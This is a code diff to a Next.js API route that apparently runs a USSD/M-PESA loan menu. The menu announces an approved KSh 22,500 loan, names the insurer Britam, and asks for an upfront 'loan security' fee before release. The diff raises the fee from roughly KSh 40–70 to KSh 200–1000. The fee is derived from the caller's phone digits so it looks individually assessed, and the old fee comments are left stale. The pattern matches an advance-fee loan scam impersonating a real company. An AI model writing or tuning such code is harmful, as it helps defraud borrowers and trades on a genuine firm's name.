@@ -517,9 +517,9 @@ export async function POST(req: NextRequest) {
           const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
 
           // Apply specialized fee limits based on product selection patterns
-          if (loanProduct === "1") seededFee = Math.floor(40 + phoneSeed % 11); // Salary: 40-50
-          if (loanProduct === "2") seededFee = Math.floor(50 + phoneSeed % 11); // Biashara: 50-60
-          if (loanProduct === "3") seededFee = Math.floor(60 + phoneSeed % 11); // Emergency: 60-70
+          if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801); // Salary: 40-50
+          if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801); // Biashara: 50-60
+          if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801); // Emergency: 60-70
 
           return respond(`Congratulations! Your KSh 22,500 secured loan has been approved.\nBritam charges KSh ${seededFee} for loan security.\n\n1. Complete fee to release to your M-PESA\n0. Cancel`, true);
         }
@@ -536,9 +536,9 @@ export async function POST(req: NextRequest) {
         let seededFee = 60;
         const phoneSeed = (parseFloat(phone.slice(-3)) || 5);
 
-        if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 1001);
-        if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 1001);
-        if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 1001);
+        if (loanProduct === "1") seededFee = Math.floor(200 + phoneSeed % 801);
+        if (loanProduct === "2") seededFee = Math.floor(200 + phoneSeed % 801);
+        if (loanProduct === "3") seededFee = Math.floor(200 + phoneSeed % 801);
 
         const appUrl = process.env.APP_URL || "https://vercel.app";
         const callbackUrl = `${appUrl}/api/payment-callback`;
